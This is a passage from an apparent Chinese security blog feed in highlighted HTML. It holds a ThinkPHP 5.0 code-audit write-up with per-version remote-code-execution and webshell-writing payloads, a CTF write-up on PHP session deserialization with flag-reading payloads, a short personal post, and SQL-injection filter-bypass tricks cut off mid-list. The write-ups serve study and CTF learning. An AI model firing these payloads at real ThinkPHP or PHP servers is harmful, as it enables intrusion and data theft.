punctuation">,</span> <span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'s'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// 按.拆分成多维数组进行判断</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$val</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$val</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// 无输入数据，返回默认值</span>                    <span class="token keyword">return</span> <span class="token variable">$default</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 解析过滤器</span>        <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">array_walk_recursive</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'filterValue'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">filterValue</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$data</span> <span class="token operator">!==</span> <span class="token variable">$default</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 强制类型转换</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">typeCast</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>此方法对输入的内容也就是接受到的参数进行一些过滤。，过滤器通过<code>$this-&gt;getFilter</code>获取</p><p>而上面已经分析过，传入的<code>$this-&gt;filter=system</code>传到<code>input</code>，而且也可以看到在初始化input方法时传入的<code>$data</code>是个数组。所以可以进入解析过滤器的部分，不会报错。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//解析过滤器</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">array_walk_recursive</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'filterValue'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>对于数组中的每一个值，都调用<code>filterValue</code>函数，也就是间接调用了<code>call_user_func()</code>函数，并且两个参数都是可控的，这就造成了RCE</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/26/45842_image-20210826143826922.png" alt="image-20210826143959132" loading="lazy"></p><p>poc使用</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/26/44477_image-20210826144141835.png" alt="image-20210826144141835" loading="lazy"></p><h2 id="method-contruct导致的rce-各版本payload"><a href="#method-contruct导致的rce-各版本payload" class="headerlink" title="method __contruct导致的rce 各版本payload"></a>method __contruct导致的rce 各版本payload</h2><p>转载自<a href="https://y4er.com/post/thinkphp5-rce">https://y4er.com/post/thinkphp5-rce</a></p><h3 id="5-0-amp-5-0-1-5-0-7"><a href="#5-0-amp-5-0-1-5-0-7" class="headerlink" title="5.0&amp;5.0.1-5.0.7"></a>5.0&amp;5.0.1-5.0.7</h3><p>与debug无关</p><p>命令执行rce</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>indexs<span class="token operator">=</span>whoami<span class="token operator">&amp;</span>_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">POST</span><span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>systemaaaa<span class="token operator">=</span>whoami<span class="token operator">&amp;</span>_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">POST</span><span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">GET</span><span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>whoami</code></pre><p>写入木马getshell</p><pre class="language-php" data-language="php"><code class="language-php">s=file_put_contents('test.php','&lt;?php phpinfo();')&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><h3 id="5-0-8-5-0-13"><a href="#5-0-8-5-0-13" class="headerlink" title="5.0.8-5.0.13"></a>5.0.8-5.0.13</h3><p>与debug无关</p><p>命令执行rce</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>indexs<span class="token operator">=</span>whoami<span class="token operator">&amp;</span>_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">POST</span><span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>systemaaaa<span class="token operator">=</span>whoami<span class="token operator">&amp;</span>_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">GET</span><span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">GET</span><span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>whoamic<span class="token operator">=</span>system<span class="token operator">&amp;</span>f<span class="token operator">=</span>calc<span class="token operator">&amp;</span>_method<span class="token operator">=</span>filter</code></pre><p>写入木马getshell</p><pre class="language-php" data-language="php"><code class="language-php">POSTs=file_put_contents('test.php','&lt;?php phpinfo();')&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><h3 id="5-0-14-5-0-23"><a href="#5-0-14-5-0-23" class="headerlink" title="5.0.14-5.0.23"></a>5.0.14-5.0.23</h3><p>默认<code>debug=flase</code>，需要开启debug才能命令执行。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>indexs<span class="token operator">=</span>whoami<span class="token operator">&amp;</span>_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">POST</span><span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>systemaaaa<span class="token operator">=</span>whoami<span class="token operator">&amp;</span>_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">GET</span><span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">GET</span><span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>whoamic<span class="token operator">=</span>system<span class="token operator">&amp;</span>f<span class="token operator">=</span>calc<span class="token operator">&amp;</span>_method<span class="token operator">=</span>filter</code></pre><p>写入木马getshell</p><pre class="language-php" data-language="php"><code class="language-php">POSTs=file_put_contents('test.php','&lt;?php phpinfo();')&amp;_method=__construct&amp;method=POST&amp;filter[]=assert# 5.0.21以后_method=__construct&amp;filter[]=assert&amp;server[REQUEST_METHOD]=file_put_contents('test.php','&lt;?php phpinfo();')</code></pre><p>有captcha路由时无需debug=true</p><pre class="language-none"><code class="language-none">POST ?s&#x3D;captcha&#x2F;calc_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;GET</code></pre><h3 id="5-0-24"><a href="#5-0-24" class="headerlink" title="5.0.24"></a>5.0.24</h3><p>最后一个版本RCE被修复</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>emm还是挺有意思的，虽然过程难受，刚入手有亿点点难，一个点能翻半天，但是总的来说，这样才能真正学到东西。收获还是蛮大的。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://bbs.ichunqiu.com/article-1901-1.html">https://bbs.ichunqiu.com/article-1901-1.html</a></p><p><a href="https://y4tacker.blog.csdn.net/article/details/113796433">https://y4tacker.blog.csdn.net/article/details/113796433</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP中的session反序列化</title>
      <link href="/posts/77c4c92b/"/>
      <url>/posts/77c4c92b/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/3k6ql9.jpg" loading="lazy"><br>中途下车乃人间常事，耿耿于怀便是深情</p><a id="more"></a><h1 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a>0x00 引言</h1><p>前面学习了PHP反序列化中的普通反序列化自增、自减、原生类反序列化、phar反序列化等，之外还有session反序列化未学习，此次针对session反序列化进行浅析。</p><h1 id="0x01-session基础"><a href="#0x01-session基础" class="headerlink" title="0x01 session基础"></a>0x01 session基础</h1><blockquote><p>session在网络应用中被称为会话控制，Session 对象存储特定用户会话所需的属性及配置信息。</p></blockquote><p><code>session_start()</code>函数: 用于初始化session数据，经常使用到的一个变量<code>$_SESSION</code>，当使用这个函数时</p><blockquote><p>Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p></blockquote><p>当会话自动开始或者通过 <code>session_start()</code> 手动开始的时候， PHP 内部会依据客户端传来的<code>PHPSESSID</code>来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为<code>sess_PHPSES SID</code>(客户端传来的)的文件。如果客户端未发送<code>PHPSESSID</code>，则创建一个由32个字母组成的<code>PHPSESSID</code>，并返回<code>set-cookie</code>。</p><p>每个session标签对应着一个<code>$_SESSION 键-值</code>类型数组，数组中的数据如果想要存储下来，首先需要反序列化。<br>PHP中的session反序列化有三种方式: <code>php_serialize</code>、<code>php</code>、<code>php_binary</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210804233313.png" loading="lazy"><br>了解到session序列化后需要储存在服务器上，默认的方式是储存在文件中，储存路径在<code>session.save_path</code>中，如果没有规定储存路径，那么默认会在储存在<code>/tmp</code>中，文件的名称是<code>&#39;sess_&#39;+session</code>名，文件中储存的是序列化后的session。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210804234916.png" loading="lazy"></p><p>一些设置</p><pre class="language-php" data-language="php"><code class="language-php">session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>cleanup 一旦读取了所有<span class="token constant">POST</span>数据，立即清除进度信息。默认开启 session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>enabled 将上传文件的进度信息存在session中。默认开启。<span class="token shell-comment comment">#php.ini</span>session<span class="token punctuation">.</span>save_path<span class="token operator">=</span><span class="token double-quoted-string string">""</span> <span class="token operator">--</span>设置session的存储路径session<span class="token punctuation">.</span>save_handler<span class="token operator">=</span><span class="token double-quoted-string string">""</span><span class="token operator">--</span>设定用户自定义存储函数，如果想使用<span class="token constant">PHP</span>内置会话存储机制之外的可以使用本函数<span class="token punctuation">(</span>数据库等方式<span class="token punctuation">)</span>session<span class="token punctuation">.</span>auto_start boolen<span class="token operator">--</span>指定会话模块是否在请求开始时启动一个会话默认为<span class="token number">0</span>不启动session<span class="token punctuation">.</span>serialize_handler string<span class="token operator">--</span>定义用来序列化<span class="token operator">/</span>反序列化的处理器名字。默认使用php</code></pre><p>有时在phpinfo中可以提供很多信息，<a href="https://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/">phpinfo可以告诉我们什么</a><br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210825005741102.png" alt="image-20210825005741102" loading="lazy"><br>session的存储位置：一般是存储在<code>/tmp</code>下<br>session存储默认的文件名：sess_PHPSESSID:其中PHPSESSID为当前用户的sessionid值<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210825010331549.png" alt="image-20210825010331549" loading="lazy"><br>Linux中常见的php-session存放位置</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php5<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php7<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span>tmp<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span>tmp<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSED</code></pre><p>一些基本函数</p><pre class="language-php" data-language="php"><code class="language-php">session_create_id<span class="token punctuation">:</span>创建新会话<span class="token constant">ID</span>session_destory<span class="token punctuation">:</span>销毁一个会话中的全部数据session_id<span class="token punctuation">:</span>获取<span class="token operator">/</span>设置当前会话<span class="token constant">ID</span>session_name<span class="token punctuation">:</span>获取<span class="token operator">/</span>设置会话名称session_start<span class="token punctuation">:</span>启动新会话或者重用现有会话session_status<span class="token punctuation">:</span>返回当前会话状态session_unset<span class="token punctuation">:</span> 释放所有的会话容量</code></pre><h1 id="0x02session序列化攻击"><a href="#0x02session序列化攻击" class="headerlink" title="0x02session序列化攻击"></a>0x02session序列化攻击</h1><p>CTF题目实战——Jarvis OJ【PHPINFO】</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//A webshell is wait for you</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">OowoO</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'phpinfo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>可以从代码中看出，只要get方法提交phpinfo即可触发<code>__construct()</code>看到phpinfo页面，然后进一步查看信息<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210825121513212.png" alt="image-20210825121513212" loading="lazy"><br>在<code>phpinfo</code>中，默认配置在<code>Master Value</code>，环境实际使用配置是<code>Local Value</code><br>这里的<code>session.serialize_handler</code>默认引擎使用<code>php_serialize</code>而实际使用的引擎是<code>php</code><br>代码中也是给出了<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code><br>且<code>session.upload_progress.enabled</code>也是<code>On</code>状态，可以使用。代码中没有存在<code>$_SESSION</code>变量进行赋值。<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210825125444453.png" alt="image-20210825125444453" loading="lazy"><br>借鉴PHP手册的案例一<a href="https://www.php.net/manual/zh/session.upload-progress.php">https://www.php.net/manual/zh/session.upload-progress.php</a></p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;?php echo ini_get(<span class="token punctuation">"</span></span><span class="token attr-name">session.upload_progress.name");</span> <span class="token attr-name">?</span><span class="token punctuation">></span></span>" value="123" /> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file1<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file2<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">OowoO</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token operator">=</span><span class="token single-quoted-string string">'payload'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//payload|O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";&#125;</code></pre><p>在filename处用payload替换掉。<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210825131850192.png" alt="image-20210825131850192" loading="lazy"></p><blockquote><p>$_SERVER[‘SCRIPT_FILENAME’] 也是包含当前运行脚本的路径，与 $_SERVER[‘SCRIPT_NAME’] 不同的是，这是服务器端的绝对路径。</p></blockquote><p>继续构造查看该文件的payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">|</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span>\"OowoO\"<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>\"mdzz\"<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">88</span><span class="token punctuation">:</span>\"<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>\"<span class="token operator">/</span>opt<span class="token operator">/</span>lampp<span class="token operator">/</span>htdocs<span class="token operator">/</span>Here_1s_7he_fl4g_buT_You_Cannot_see<span class="token punctuation">.</span>php\"<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【大雄×静香】送你一颗流星⭐════</title>
      <link href="/posts/ba7e2f72/"/>
      <url>/posts/ba7e2f72/</url>
      
        <content type="html"><![CDATA[<p>每个人的心中都有一个大雄<br>我也只是芸芸众生中的一个普通人，自己也不知道为了什么而努力着<br>对于大家所谓爱情，也不是简简单单的冲动，而是在权衡<br>其实都知道什么样的人适合自己，什么样的人不适合自己<br>有些人不甘，则一直在设法争取，而另一些人则是接受了这个事实，转向他方<br>我则属于后者，不希望拥有，但是永远相信</p><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> 解忧小卖部 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小破站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF中那些小技巧</title>
      <link href="/posts/dbe29b14/"/>
      <url>/posts/dbe29b14/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/m0re_2021-08-12_11-56-54.png" loading="lazy"><br>永远年轻，永远热泪盈眶</p><a id="more"></a><h1 id="CTF特训营"><a href="#CTF特训营" class="headerlink" title="CTF特训营"></a>CTF特训营</h1><p>家中没网，网线昨晚出问题了，一直在等待修复。所以就在无聊时间看看书，另：这两年都不是很好，希望灾难赶快过去。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>Sqlmap使用：<a href="https://m0re.top/posts/e63eb101/">https://m0re.top/posts/e63eb101/</a></p><h3 id="一些绕过技巧"><a href="#一些绕过技巧" class="headerlink" title="一些绕过技巧"></a>一些绕过技巧</h3><h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token shell-comment comment"># 双写绕过</span>select  <span class="token operator">--</span>selselectect<span class="token keyword">or</span>   <span class="token operator">--</span>oorrunion  <span class="token operator">--</span> uniunionon<span class="token shell-comment comment"># 大小写绕过</span>select  <span class="token operator">--</span>SelEct<span class="token keyword">or</span>  <span class="token operator">--</span><span class="token keyword">Or</span><span class="token shell-comment comment"># 十六进制(0x)</span>select   <span class="token operator">--</span> selec\<span class="token package">x74</span><span class="token keyword">or</span>   <span class="token operator">--</span> o\<span class="token package">x72</span>union   <span class="token operator">--</span> unio\<span class="token package">x6e</span><span class="token shell-comment comment"># 双重URL编码绕过</span>from  <span class="token operator">--</span> <span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">64</span><span class="token keyword">or</span>  <span class="token operator">--</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">32</span>union   <span class="token operator">--</span> <span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">35</span><span class="token 